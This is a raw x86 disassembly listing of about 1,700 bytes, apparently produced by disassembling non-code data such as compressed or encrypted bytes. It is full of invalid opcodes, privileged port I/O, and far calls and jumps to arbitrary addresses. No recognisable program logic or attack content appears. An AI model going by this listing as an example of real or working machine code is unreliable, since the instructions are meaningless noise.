  4b5799:	sbb    edi,DWORD PTR [ecx-0x797d81a4]
  4b579f:	fwait
  4b57a0:	lock sbb esp,0x8deedda5
  4b57a7:	and    BYTE PTR [ecx+0xd],dh
  4b57aa:	xor    al,0xb4
  4b57ac:	mov    BYTE PTR [eax+0x38],al
  4b57af:	push   ss
  4b57b0:	pop    esi
  4b57b1:	call   0xe868:0x38556d01
  4b57b8:	push   esp
  4b57b9:	popf   
  4b57ba:	xor    bh,BYTE PTR [ebx-0x121393ac]
  4b57c0:	cwde   
  4b57c1:	icebp  
  4b57c2:	lea    eax,[ebx-0x6f625a35]
  4b57c8:	cld    
  4b57c9:	xchg   esp,eax
  4b57ca:	fcomp  QWORD PTR [edx-0x68d1b905]
  4b57d0:	retf   
  4b57d1:	sahf   
  4b57d2:	mov    ds:0xddaeaaa6,al
  4b57d7:	repz sti 
  4b57d9:	push   esp
  4b57da:	loopne 0x4b5795
  4b57dc:	add    eax,0x1085c7c6
  4b57e1:	push   es
  4b57e2:	fistp  DWORD PTR [ebp-0x625868c5]
  4b57e8:	adc    al,0x1e
  4b57ea:	cmp    BYTE PTR [edi],al
  4b57ec:	cmp    al,0xa
  4b57ee:	lods   al,BYTE PTR ds:[esi]
  4b57ef:	pop    esp
  4b57f0:	mov    esi,0x1764604b
  4b57f5:	mov    BYTE PTR [ebp+ecx*4-0x107c1850],cl
  4b57fc:	mov    ebx,0xc1b8fdb4
  4b5801:	mov    esp,0x97e415b1
  4b5806:	retf   
  4b5807:	or     DWORD PTR [esi],0xffffffa7
  4b580a:	ret    0xc60f
  4b580d:	retf   0x1ece
  4b5810:	push   esp
  4b5811:	inc    esi
  4b5812:	cs rcl dh,cl
  4b5815:	hlt    
  4b5816:	arpl   ax,sp
  4b5818:	pop    ebp
  4b5819:	dec    esi
  4b581a:	cs sub eax,0xece8fc21
  4b5820:	lock xchg ebp,eax
  4b5822:	fucom  st(5)
  4b5824:	repnz or esi,esp
  4b5827:	clc    
  4b5828:	cld    
  4b5829:	push   ebp
  4b582a:	add    al,0x55
  4b582c:	or     al,0x5d
  4b582e:	cs add eax,0xf866fc95
  4b5834:	sar    al,0x14
  4b5837:	jae    0x4b57f2
  4b5839:	pop    esp
  4b583a:	fisubr DWORD PTR [eax]
  4b583c:	or     bl,BYTE PTR [eax]
  4b583e:	sbb    al,0x20
  4b5840:	and    al,0x96
  4b5842:	out    dx,eax
  4b5843:	repnz loope 0x4b57e7
  4b5846:	sub    bl,cl
  4b5848:	in     al,0x0
  4b584a:	xchg   DWORD PTR [eax],esi
  4b584c:	xchg   edi,eax
  4b584d:	out    dx,eax
  4b584e:	push   edx
  4b584f:	fldenv [esi]
  4b5851:	or     ah,bh
  4b5853:	or     BYTE PTR [eax*4-0x5688bbc0],bh
  4b585a:	pop    esp
  4b585b:	cs dec eax
  4b585d:	dec    esp
  4b585e:	sbb    BYTE PTR [eax],dl
  4b5860:	pop    ebp
  4b5861:	xchg   edi,eax
  4b5862:	out    dx,eax
  4b5863:	(bad)
  4b5866:	pop    eax
  4b5867:	cld    
  4b5868:	popf   
  4b5869:	and    al,0x31
  4b586b:	cmp    BYTE PTR [eax],ah
  4b586d:	pop    ss
  4b586e:	ja     0x4b582b
  4b5870:	pop    ds
  4b5871:	push   ecx
  4b5872:	add    BYTE PTR [ebx-0x73],ch
  4b5875:	sub    BYTE PTR [ebx],ah
  4b5877:	or     eax,0xef6d552c
  4b587c:	mov    ebx,0xdd64b77c
  4b5881:	pusha  
  4b5882:	dec    ebp
  4b5883:	or     al,0x34
  4b5885:	inc    ecx
  4b5886:	sbb    al,0x97
  4b5888:	mov    ebp,0x66bef973
  4b588d:	shr    DWORD PTR [edx+0xb],1
  4b5890:	outs   dx,BYTE PTR ds:[esi]
  4b5891:	jb     0x4b5903
  4b5893:	jbe    0x4b5912
  4b5895:	fucomip st,st(7)
  4b5897:	shl    bh,cl
  4b5899:	adc    BYTE PTR [eax+0x791415df],al
  4b589f:	pop    esp
  4b58a0:	dec    ecx
  4b58a1:	test   dl,dh
  4b58a3:	mov    ebx,0xb9adf8bc
  4b58a8:	add    ebp,DWORD PTR [ebx-0x28]
  4b58ab:	fmul   QWORD PTR [ebx]
  4b58ad:	add    al,0xfc
  4b58af:	movsx  esp,bh
  4b58b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b58b3:	sub    al,0xc7
  4b58b5:	test   DWORD PTR [eax+0x2],edx
  4b58b8:	inc    ebx
  4b58b9:	push   esp
  4b58ba:	xor    DWORD PTR [eax-0x69],edi
  4b58bd:	out    dx,eax
  4b58be:	sti    
  4b58bf:	jge    0x4b58f8
  4b58c1:	jl     0x4b5882
  4b58c3:	xchg   ebp,eax
  4b58c4:	mov    BYTE PTR [edi-0x6d71f476],cl
  4b58ca:	or     DWORD PTR [esi],ebx
  4b58cc:	int3   
  4b58cd:	cs xchg esi,eax
  4b58cf:	fstp   DWORD PTR [eax+0x3b]
  4b58d2:	call   0x9e95:0x7ded2e17
  4b58d9:	push   eax
  4b58da:	and    ebp,DWORD PTR [eax-0x494da70f]
  4b58e0:	retf   0x72ec
  4b58e3:	stc    
  4b58e4:	or     edi,DWORD PTR [edx-0x399c3d42]
  4b58ea:	mov    ecx,0x54caba5d
  4b58ef:	(bad)  
  4b58f0:	rcl    BYTE PTR ds:0xdc79d85c,1
  4b58f6:	je     0x4b588f
  4b58f8:	retf   
  4b58f9:	ja     0x4b58db
  4b58fb:	or     esp,esp
  4b58fd:	call   0xa58faeee
  4b5902:	mov    ebx,0xa0473e5c
  4b5907:	push   esp
  4b5908:	cld    
  4b5909:	sub    eax,0x30fba94c
  4b590e:	shr    DWORD PTR [ecx+edi*2-0x57a76450],0x76
  4b5916:	pop    esi
  4b5917:	mov    esi,0x4b2a231
  4b591c:	std    
  4b591d:	(bad)  
  4b591e:	enter  0x763c,0x1f
  4b5922:	jl     0x4b58bb
  4b5924:	aam    0x40
  4b5926:	arpl   ax,si
  4b5928:	cmc    
  4b5929:	sbb    ch,bh
  4b592b:	popf   
  4b592c:	pushf  
  4b592d:	push   esp
  4b592e:	cs (bad) 
  4b5931:	jne    0x4b58bb
  4b5933:	std    
  4b5934:	or     edx,DWORD PTR [eax]
  4b5936:	adc    al,0x77
  4b5938:	stc    
  4b5939:	ds jge 0x4b58dd
  4b593c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b593d:	out    0xf8,eax
  4b593f:	jne    0x4b5989
  4b5941:	and    BYTE PTR [ecx-0x4b],ch
  4b5944:	mov    dl,0xbd
  4b5946:	retf   
  4b5947:	mov    WORD PTR [eax],gs
  4b5949:	sar    DWORD PTR [esi],0x0
  4b594c:	std    
  4b594d:	mov    al,ds:0xbbefbe54
  4b5952:	in     al,dx
  4b5953:	das    
  4b5954:	dec    eax
  4b5955:	std    
  4b5956:	cwde   
  4b5957:	inc    ecx
  4b5958:	sub    al,0x93
  4b595a:	xor    BYTE PTR [edi-0x46ad10cc],dh
  4b5960:	pop    esp
  4b5961:	cmp    BYTE PTR [esp+edx*4],bh
  4b5964:	and    al,0x77
  4b5966:	add    BYTE PTR [edi-0x606f41a3],ah
  4b596c:	push   eax
  4b596d:	data16 mov BYTE PTR [edx+ecx*4+0x73],dl
  4b5972:	jns    0x4b5983
  4b5974:	push   ss
  4b5975:	ds dec esp
  4b5977:	push   esp
  4b5978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b5979:	xchg   ebp,eax
  4b597a:	xchg   edi,eax
  4b597b:	retf   0xa4ca
  4b597e:	cld    
  4b597f:	int3   
  4b5980:	cld    
  4b5981:	hlt    
  4b5982:	sbb    al,0xfd
  4b5984:	inc    eax
  4b5985:	retf   
  4b5986:	neg    DWORD PTR [ebp-0x66]
  4b5989:	std    
  4b598a:	or     DWORD PTR [ebp+edi*4+0x56],eax
  4b598e:	or     ebx,DWORD PTR [edx+0x3d]
  4b5991:	fisttp WORD PTR [ebx-0x29da169]
  4b5997:	add    esp,DWORD PTR [esi+0x5d]
  4b599a:	push   0xd7cb60a
  4b599f:	jle    0x4b5952
  4b59a1:	ins    BYTE PTR es:[edi],dx
  4b59a2:	addps  xmm6,xmm7
  4b59a5:	je     0x4b5a05
  4b59a7:	jb     0x4b5962
  4b59a9:	jl     0x4b5942
  4b59ab:	js     0x4b5a29
  4b59ad:	or     eax,DWORD PTR [eax+0x277c8884]
  4b59b3:	xchg   edi,eax
  4b59b4:	out    dx,al
  4b59b5:	mov    WORD PTR [ecx+0x3c],fs
  4b59b8:	pushf  
  4b59b9:	mov    ds:0xe460a6e5,al
  4b59be:	jb     0x4b5979
  4b59c0:	stos   BYTE PTR es:[edi],al
  4b59c1:	scas   al,BYTE PTR es:[edi]
  4b59c2:	mov    dl,0xb6
  4b59c4:	mov    edx,0xd5d2e5cb
  4b59c9:	inc    esp
  4b59ca:	jo     0x4b5a04
  4b59cc:	shr    BYTE PTR ds:0x3c507c4c,0x5c
  4b59d3:	cwde   
  4b59d4:	arpl   WORD PTR [edx],si
  4b59d6:	add    eax,0x4b977cc8
  4b59db:	mov    ebx,DWORD PTR [eax-0x60]
  4b59de:	dec    eax
  4b59df:	into   
  4b59e0:	mov    ecx,0x72374bd2
  4b59e5:	mov    ecx,0x8bdedad6
  4b59ea:	add    al,0x7c
  4b59ec:	pop    ebp
  4b59ed:	scas   al,BYTE PTR es:[edi]
  4b59ee:	xchg   ecx,eax
  4b59ef:	les    edx,FWORD PTR [eax+0x7d]
  4b59f2:	das    
  4b59f3:	or     al,0xa1
  4b59f5:	lock cmp dh,BYTE PTR [eax+0x2e]
  4b59f9:	or     esp,0x8
  4b59fc:	xchg   esp,eax
  4b59fd:	std    
  4b59fe:	retf   0xa957
  4b5a01:	push   esp
  4b5a02:	std    
  4b5a03:	(bad)  
  4b5a04:	(bad)  
  4b5a05:	xchg   edx,eax
  4b5a06:	hlt    
  4b5a07:	push   ebx
  4b5a08:	in     eax,0xd2
  4b5a0a:	pop    ebp
  4b5a0b:	mov    esi,0x101051ec
  4b5a10:	sub    eax,0x1df2f4fc
  4b5a15:	(bad)  
  4b5a17:	clc    
  4b5a18:	push   ebx
  4b5a19:	icebp  
  4b5a1a:	sbb    dh,bh
  4b5a1c:	adc    al,0xfe
  4b5a1e:	jmp    0xbea96923
  4b5a23:	out    dx,eax
  4b5a24:	push   ds
  4b5a25:	xchg   ecx,eax
  4b5a26:	and    cl,BYTE PTR [ebx]
  4b5a28:	es sub bh,dh
  4b5a2b:	dec    ebx
  4b5a2c:	cs xchg esi,eax
  4b5a2e:	xor    cl,0x74
  4b5a31:	mov    DWORD PTR [eax+0x774ea5be],ebp
  4b5a37:	test   eax,0xfe1c946c
  4b5a3c:	lods   al,BYTE PTR ds:[esi]
  4b5a3d:	cmp    BYTE PTR [ecx],bh
  4b5a3f:	mov    al,0xdd
  4b5a41:	adc    ebp,DWORD PTR [eax]
  4b5a43:	add    eax,0x2b0aa986
  4b5a48:	xchg   edi,eax
  4b5a49:	retf   
  4b5a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b5a4b:	push   ss
  4b5a4c:	mov    eax,0xb5e4e0bc
  4b5a51:	or     ah,ch
  4b5a53:	cs xchg ebp,eax
  4b5a55:	xchg   ebp,eax
  4b5a56:	dec    BYTE PTR [esi+edi*8]
  4b5a59:	xor    BYTE PTR [ecx+eiz*8],dh
  4b5a5c:	xchg   ebp,eax
  4b5a5d:	cmp    al,0x72
  4b5a5f:	sub    DWORD PTR [eax],edi
  4b5a61:	mov    eax,0x46142f40
  4b5a66:	dec    edx
  4b5a67:	or     edx,0xffffffc8
  4b5a6a:	in     eax,0x4e
  4b5a6c:	push   edx
  4b5a6d:	push   esi
  4b5a6e:	mov    eax,0x2e54bb5d
  4b5a73:	frstor [eax+0x15]
  4b5a76:	mov    esp,0x8368c064
  4b5a7b:	cs xchg edi,eax
  4b5a7d:	out    dx,eax
  4b5a7e:	jb     0x4b5aec
  4b5a80:	jo     0x4b5a8d
  4b5a82:	je     0x4b5afc
  4b5a84:	jl     0x4b5a1b
  4b5a86:	dec    ebx
  4b5a87:	ja     0x4b5a72
  4b5a89:	push   ebp
  4b5a8a:	test   al,0x88
  4b5a8c:	adc    eax,0x3cb08cac
  4b5a91:	pushf  
  4b5a92:	pop    ds
  4b5a93:	cs nop
  4b5a95:	and    eax,0xb432b405
  4b5a9a:	in     eax,0x72
  4b5a9c:	rcr    DWORD PTR [ebx],0xb0
  4b5a9f:	in     al,dx
  4b5aa0:	xchg   esp,eax
  4b5aa1:	das    
  4b5aa2:	xchg   esi,eax
  4b5aa3:	call   0xa29e:0xcb91ba56
  4b5aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b5aab:	sub    DWORD PTR [ecx*4-0x26ad117c],0xfeaccc74
  4b5ab6:	sub    BYTE PTR [ecx+edi*1-0x68834426],dh
  4b5abd:	xor    al,0xb0
  4b5abf:	sub    eax,0x26a9bc30
  4b5ac4:	mov    eax,0x5c3efbe5
  4b5ac9:	loopne 0x4b5a66
  4b5acb:	shr    BYTE PTR [ecx+0x2ec80bc4],0xdf
  4b5ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b5ad3:	ret    
  4b5ad4:	int3   
  4b5ad5:	mov    edi,0xe851d8e4
  4b5ada:	fdiv   st(2),st
  4b5adc:	jge    0x4b5b4e
  4b5ade:	jmp    0x642c4710
  4b5ae3:	or     eax,0xfee42ff0
  4b5ae8:	jns    0x4b5b5a
  4b5aea:	stc    
  4b5aeb:	scas   al,BYTE PTR es:[edi]
  4b5aec:	add    eax,0xea18d3e8
  4b5af1:	popa   
  4b5af2:	out    dx,al
  4b5af3:	pop    ss
  4b5af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b5af5:	xor    dh,BYTE PTR [edx-0xe]
  4b5af8:	not    BYTE PTR [esp+ebx*4]
  4b5afb:	inc    esp
  4b5afc:	xchg   edi,eax
  4b5afd:	cmp    DWORD PTR [edi-0x1af345c2],0x0
  4b5b04:	call   DWORD PTR [esp+ebx*1+0x4]
  4b5b08:	(bad)  
  4b5b09:	mov    eax,DWORD PTR [edi-0x6b]
  4b5b0c:	jmp    DWORD PTR [eax]
  4b5b0e:	cmp    DWORD PTR [eax+0x53],ebx
  4b5b11:	pop    esp
  4b5b12:	lea    eax,[ebx+edx*8]
  4b5b15:	adc    DWORD PTR [ebx],ebx
  4b5b17:	add    BYTE PTR [ecx+edi*4],0x54
  4b5b1b:	pushf  
  4b5b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b5b1d:	adc    ch,BYTE PTR [eax-0x2b2f6df2]
  4b5b23:	mov    dh,0x85
  4b5b25:	fidiv  WORD PTR [edi-0x8]
  4b5b28:	pop    ss
  4b5b29:	cld    
  4b5b2a:	fnstenv [eax+0x33ff0c92]
  4b5b30:	je     0x4b5af6
  4b5b32:	pop    es
  4b5b33:	mov    ch,0x33
  4b5b35:	int3   
  4b5b36:	mov    ds:0xbb4bc110,eax
  4b5b3b:	xchg   ecx,eax
  4b5b3c:	call   DWORD PTR [edx]
  4b5b3e:	push   cs
  4b5b3f:	or     dl,BYTE PTR [esi]
  4b5b41:	sbb    bh,bh
  4b5b43:	xor    eax,0xf3c1ee97
  4b5b48:	push   ds
  4b5b49:	call   eax
  4b5b4b:	fwait
  4b5b4c:	sub    al,0x15
  4b5b4e:	fdiv   DWORD PTR [esi+eax*1]
  4b5b51:	inc    ecx
  4b5b52:	pop    eax
  4b5b53:	outs   dx,BYTE PTR ds:[esi]
  4b5b54:	popa   
  4b5b55:	cmp    al,0x9b
  4b5b57:	sub    bl,BYTE PTR [ebx]
  4b5b59:	pop    esp
  4b5b5a:	fidivr WORD PTR [eax+edi*4]
  4b5b5d:	push   eax
  4b5b5e:	jno    0x4b5b20
  4b5b60:	push   ebx
  4b5b61:	sub    bl,cl
  4b5b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b5b64:	repnz pop ebp
  4b5b66:	aam    0x2d
  4b5b68:	pop    eax
  4b5b69:	enter  0x9730,0x4b
  4b5b6d:	pop    ebx
  4b5b6e:	mov    esi,0x266099dc
  4b5b73:	cmp    BYTE PTR [esp+eiz*2+0x7df74bbe],bh
  4b5b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b5b7b:	push   0x9c6d6c0b
  4b5b80:	push   esp
  4b5b81:	inc    ebp
  4b5b82:	(bad)  
  4b5b83:	jmp    0x4b5b6a
  4b5b85:	jmp    0x4b5bdd
  4b5b87:	inc    ebp
  4b5b88:	and    BYTE PTR [edi+0x5c],0x21
  4b5b8c:	xchg   esp,eax
  4b5b8d:	mov    WORD PTR [ecx+0x4ded3eeb],cs
  4b5b93:	test   eax,0x48c374a1
  4b5b98:	xor    bh,BYTE PTR [eax+0x4ae55f7c]
  4b5b9e:	call   FWORD PTR [eax-0x5fa88787]
  4b5ba4:	mov    al,ds:0x7bef9586
  4b5ba9:	add    al,0x80
  4b5bab:	dec    edi
  4b5bac:	jl     0x4b5bf1
  4b5bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b5baf:	dec    ebp
  4b5bb0:	test   BYTE PTR [edx],ah
  4b5bb2:	sub    al,0xed
  4b5bb4:	rcl    DWORD PTR [eax+edi*2-0x77aa5348],cl
  4b5bbb:	cs jl  0x4b5b88
  4b5bbe:	push   es
  4b5bbf:	pop    ss
  4b5bc0:	inc    ebp
  4b5bc1:	out    dx,al
  4b5bc2:	lods   al,BYTE PTR ds:[esi]
  4b5bc3:	and    bh,bh
  4b5bc5:	xchg   DWORD PTR ds:0xb24be5c,ecx
  4b5bcb:	dec    esp
  4b5bcc:	je     0x4b5c01
  4b5bce:	add    al,0x34
  4b5bd0:	mov    al,ds:0x310f98b0
  4b5bd5:	pushf  
  4b5bd6:	xlat   BYTE PTR ds:[ebx]
  4b5bd7:	xor    al,0xad
  4b5bd9:	add    eax,0xb204ae5d
  4b5bde:	mov    dh,0xba
  4b5be0:	mov    BYTE PTR [esi+esi*4+0x38beb65d],dh
  4b5be7:	rcl    BYTE PTR [eax],0xc4
  4b5bea:	sbb    cl,BYTE PTR [ebp-0x38]
  4b5bed:	and    dl,cl
  4b5bef:	add    al,0xce
  4b5bf1:	or     dh,BYTE PTR ds:0xd6d2d34d
  4b5bf7:	fcmovu st,st(6)
  4b5bf9:	data16 sub al,0x1
  4b5bfc:	loopne 0x4b5c67
  4b5bfe:	push   edx
  4b5bff:	loop   0x4b5be7
  4b5c01:	imul   edx,eax,0xa78626a0
  4b5c07:	inc    ebp
  4b5c08:	add    ebp,DWORD PTR [ecx]
  4b5c0a:	mov    ch,0xa7
  4b5c0c:	mov    ah,0xc
  4b5c0e:	add    al,0x4
  4b5c10:	adc    al,0xf6
  4b5c12:	cmp    cl,BYTE PTR [esi+0x43]
  4b5c15:	and    al,0x38
  4b5c17:	out    0xe,eax
  4b5c19:	add    esi,DWORD PTR ds:0x5e111b42
  4b5c1f:	push   cs
  4b5c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b5c21:	or     BYTE PTR ds:0x4cf0caa8,0xdc
  4b5c28:	sbb    DWORD PTR [ebx+0x8],ecx
  4b5c2b:	fs ins DWORD PTR es:[edi],dx
  4b5c2d:	in     al,dx
  4b5c2e:	push   ecx
  4b5c2f:	lahf   
  4b5c30:	jno    0x4b5c22
  4b5c32:	push   ebx
  4b5c33:	imul   ebp,DWORD PTR [eax],0xdc485875
  4b5c39:	lea    eax,[esi]
  4b5c3b:	push   esp
  4b5c3c:	push   esi
  4b5c3d:	jmp    0x4b5c42
  4b5c3f:	das    
  4b5c40:	pop    eax
  4b5c41:	fld    DWORD PTR [esi+0x1fb8e44a]
  4b5c47:	cmp    eax,DWORD PTR [esi+0x7d023a71]
  4b5c4d:	aad    0x2a
  4b5c4f:	jne    0x4b5c73
  4b5c51:	mov    al,0xe1
  4b5c53:	nop
  4b5c54:	inc    eax
  4b5c55:	scas   al,BYTE PTR es:[edi]
  4b5c56:	cld    
  4b5c57:	push   0x29
  4b5c59:	add    eax,edi
  4b5c5b:	mov    bh,0xa6
  4b5c5d:	test   al,dh
  4b5c5f:	mov    WORD PTR [ebx],es
  4b5c61:	leave  
  4b5c62:	test   DWORD PTR ds:0xecdfbb20,eax
  4b5c68:	jmp    0x4b5c90
  4b5c6a:	cmp    al,0x1f
  4b5c6c:	add    al,dh
  4b5c6e:	sub    al,0xa3
  4b5c70:	std    
  4b5c71:	sub    eax,0xad34650f
  4b5c76:	xor    eax,0xc6115337
  4b5c7b:	mov    cl,0x48
  4b5c7d:	fldcw  WORD PTR [edi-0x51]
  4b5c80:	retf   
  4b5c81:	rcr    ah,cl
  4b5c83:	popa   
  4b5c84:	sbb    al,BYTE PTR [ebx+0x7946283a]
  4b5c8a:	fild   DWORD PTR [ecx+0x28]
  4b5c8d:	pop    edx
  4b5c8e:	add    eax,0xd8b6e485
  4b5c93:	and    al,0xe1
  4b5c95:	das    
  4b5c96:	fld    QWORD PTR [ebx+0x594827f]
  4b5c9c:	xor    al,0x54
  4b5c9e:	xchg   esi,eax
  4b5c9f:	sahf   
  4b5ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b5ca1:	clc    
  4b5ca2:	inc    esp
  4b5ca3:	div    DWORD PTR [esi+0x105f8e50]
  4b5ca9:	mov    esi,0x1405848b
  4b5cae:	and    DWORD PTR [edi-0x11],eax
  4b5cb1:	xor    DWORD PTR [eax-0x7a58436c],0x41ad26c0
  4b5cbb:	mov    edi,0x71ad9389
  4b5cc0:	fsub   DWORD PTR [edi+0x2]
  4b5cc3:	jge    0x4b5d40
  4b5cc5:	adc    edi,DWORD PTR [eax-0x95c300]
  4b5ccb:	add    eax,DWORD PTR [ecx]
  4b5ccd:	jne    0x4b5c9f
  4b5ccf:	adc    eax,0x62c40805
  4b5cd4:	add    ecx,esp
  4b5cd6:	inc    eax
  4b5cd7:	mov    WORD PTR [eax-0x3e],fs
  4b5cda:	or     al,0x11
  4b5cdc:	sub    BYTE PTR [ecx-0x116f81af],0xd2
  4b5ce3:	lea    edx,cs:[eax]
  4b5ce6:	inc    ebx
  4b5ce7:	cmp    al,0x2b
  4b5ce9:	(bad)  
  4b5cea:	dec    eax
  4b5ceb:	cwde   
  4b5cec:	xchg   ch,bl
  4b5cee:	mov    dh,0xc8
  4b5cf0:	add    DWORD PTR [ecx-0x53],edx
  4b5cf3:	push   edi
  4b5cf4:	sbb    DWORD PTR [edx],ebp
  4b5cf6:	test   ebx,edx
  4b5cf8:	loope  0x4b5d26
  4b5cfa:	jmp    0x4b5d22
  4b5cfc:	pusha  
  4b5cfd:	or     edi,esp
  4b5cff:	(bad)  
  4b5d01:	xlat   BYTE PTR ds:[ebx]
  4b5d02:	push   edx
  4b5d03:	mov    eax,0x44f7de09
  4b5d08:	mov    BYTE PTR [eax+0x34],ch
  4b5d0b:	dec    ecx
  4b5d0c:	fisttp WORD PTR [eax+0x6b]
  4b5d0f:	sbb    esp,DWORD PTR [edx-0x76]
  4b5d12:	push   0x14060b44
  4b5d17:	adc    DWORD PTR [ebx],0xffffff97
  4b5d1a:	imul   edi,esp,0xffffff84
  4b5d1d:	popa   
  4b5d1e:	popa   
  4b5d1f:	xor    ebx,DWORD PTR [ebx+ebx*2]
  4b5d22:	push   es
  4b5d23:	add    dl,al
  4b5d25:	xor    esp,DWORD PTR [eax-0x1]
  4b5d28:	cdq    
  4b5d29:	retf   0xc801
  4b5d2c:	dec    ebx
  4b5d2d:	sub    eax,DWORD PTR [eax-0x418bf2e2]
  4b5d33:	dec    ebp
  4b5d34:	popa   
  4b5d35:	leave  
  4b5d36:	shr    edi,0x1e
  4b5d39:	xor    eax,DWORD PTR [esi]
  4b5d3b:	sub    dl,cl
  4b5d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b5d3e:	sbb    DWORD PTR [eax+0x5c],ebp
  4b5d41:	cs push esi
  4b5d43:	mov    edx,0x9b777860
  4b5d48:	test   BYTE PTR [ebx+0x299b2863],ah
  4b5d4e:	jl     0x4b5cea
  4b5d50:	mov    ebx,0x6aac29ed
  4b5d55:	adc    DWORD PTR [ebp-0x35c1dd29],ecx
  4b5d5b:	in     al,0xee
  4b5d5d:	xor    dl,BYTE PTR [esi-0x6d]
  4b5d60:	das    
  4b5d61:	or     BYTE PTR [ebx+edx*1],bh
  4b5d64:	pop    ss
  4b5d65:	push   edi
  4b5d66:	sbb    BYTE PTR [edi+0x568da15a],cl
  4b5d6c:	div    DWORD PTR [eax+0x1a02a5d8]
  4b5d72:	adc    esi,ebp
  4b5d74:	cmp    BYTE PTR [ebx-0x2b6a8878],dh
  4b5d7a:	and    dl,dh
  4b5d7c:	cs mov edx,0x14449ea8
  4b5d82:	(bad)  
  4b5d83:	sub    eax,0xc33b2d64
  4b5d88:	jg     0x4b5da4
  4b5d8a:	pop    ebx
  4b5d8b:	mov    dh,0xf1
  4b5d8d:	push   0xb58c0563
  4b5d92:	or     BYTE PTR [ebx+edx*1],dh
  4b5d95:	sbb    BYTE PTR [eax+0x75],cl
  4b5d98:	sbb    BYTE PTR [eax-0x4d],bl
  4b5d9b:	mov    bh,0xf5
  4b5d9d:	mov    al,dl
  4b5d9f:	mov    edx,0x4301dac
  4b5da4:	or     ah,cl
  4b5da6:	fnstsw WORD PTR [esi+0x13]
  4b5da9:	sub    al,0x29
  4b5dab:	cmp    al,0xf4
  4b5dad:	xor    al,0xb4
  4b5daf:	ret    0x788b
  4b5db2:	sub    BYTE PTR ds:0xf035ac7b,dh
  4b5db8:	inc    eax
  4b5db9:	test   eax,0x1d2f53e8
  4b5dbe:	and    al,0xa5
  4b5dc0:	push   ebx
  4b5dc1:	or     BYTE PTR [ebx+eax*1-0x28],0x23
  4b5dc6:	xor    BYTE PTR [eax],al
  4b5dc8:	dec    esp
  4b5dc9:	jecxz  0x4b5e08
  4b5dcb:	jl     0x4b5e26
  4b5dcd:	stos   DWORD PTR es:[edi],eax
  4b5dce:	push   bp
  4b5dd0:	add    dl,BYTE PTR [esi+ebx*2]
  4b5dd3:	addr16 icebp 
  4b5dd5:	mov    al,0xd
  4b5dd7:	fs xchg ecx,eax
  4b5dd9:	or     BYTE PTR [edx-0x4f],dl
  4b5ddc:	xor    al,0x6a
  4b5dde:	inc    ecx
  4b5ddf:	xchg   esi,eax
  4b5de0:	sub    BYTE PTR ds:0x2ec59da4,0x5e
  4b5de7:	imul   esp,DWORD PTR [edx+0x1b3a9669],0xffffffab
  4b5dee:	pop    es
  4b5def:	inc    edx
  4b5df0:	sbb    al,0x0
  4b5df2:	add    dh,BYTE PTR cs:[ecx+0x71]
  4b5df6:	add    ecx,DWORD PTR [ebp-0x1353b2ab]
  4b5dfc:	cmp    BYTE PTR [edi-0x5f4acaaf],ch
  4b5e02:	cdq    
  4b5e03:	leave  
  4b5e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b5e05:	out    0x14,eax
  4b5e07:	pusha  
  4b5e08:	jge    0x4b5e52
  4b5e0a:	pop    eax
  4b5e0b:	lods   al,BYTE PTR ds:[esi]
  4b5e0c:	inc    esp
  4b5e0d:	xor    ebx,esp
  4b5e0f:	ins    BYTE PTR es:[edi],dx
  4b5e10:	test   BYTE PTR [eax+0x8],dl
  4b5e13:	xor    edi,DWORD PTR ds:0x3e064234
  4b5e19:	pop    eax
  4b5e1a:	in     eax,0xdb
  4b5e1c:	or     edx,DWORD PTR [eax]
  4b5e1e:	out    0xb2,al
  4b5e20:	add    BYTE PTR [eax+0x44],ch
  4b5e23:	xchg   esp,eax
  4b5e24:	in     eax,0x3
  4b5e26:	jp     0x4b5e5a
  4b5e28:	mov    al,ds:0x79c012a7
  4b5e2d:	imul   esi,DWORD PTR [esi+0x6],0x10
  4b5e31:	sub    DWORD PTR [ecx],ebx
  4b5e33:	xadd   bh,dl
  4b5e36:	xchg   esi,eax
  4b5e37:	or     ebp,ecx
  4b5e39:	mov    al,0xf0
  4b5e3b:	sbb    al,0x4a
  4b5e3d:	lods   eax,DWORD PTR ds:[esi]
  4b5e3e:	add    BYTE PTR [esi+0x0],bh
  4b5e41:	and    ebp,DWORD PTR [esi-0x1a]
  4b5e44:	jbe    0x4b5e6d
  4b5e46:	rcr    BYTE PTR [eax],0x2d
  4b5e49:	hlt    
  4b5e4a:	mov    bl,0x1c
  4b5e4c:	pop    es
  4b5e4d:	(bad)  
  4b5e4e:	adc    DWORD PTR [esi],edx
  4b5e50:	sbb    al,0xbe
  4b5e52:	push   esp
  4b5e53:	pushf  
  4b5e54:	and    DWORD PTR [eax],ebp
  4b5e56:	in     eax,0x2d
  4b5e58:	ins    DWORD PTR es:[edi],dx
  4b5e59:	mov    DWORD PTR [ebp-0x56e9b941],eax
  4b5e5f:	dec    esi
  4b5e60:	inc    ebx
  4b5e61:	sbb    bl,ch
  4b5e63:	cmp    DWORD PTR [ecx],eax
  4b5e65:	xchg   esi,eax
  4b5e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b5e67:	xchg   ecx,eax
  4b5e68:	dec    ebp
  4b5e69:	daa    
  4b5e6a:	push   0x1d82f813
  4b5e6f:	inc    ebx
  4b5e70:	jne    0x4b5e74
  4b5e72:	jbe    0x4b5e87
  4b5e74:	adc    DWORD PTR [edi+0x50353482],0xffffff84
  4b5e7b:	test   edi,0xac8cb71
  4b5e81:	inc    eax
  4b5e82:	je     0x4b5e89
  4b5e84:	dec    ebx
  4b5e85:	xchg   esi,eax
  4b5e86:	push   esi
  4b5e87:	or     al,0x5c
  4b5e89:	sub    eax,0x99c05663
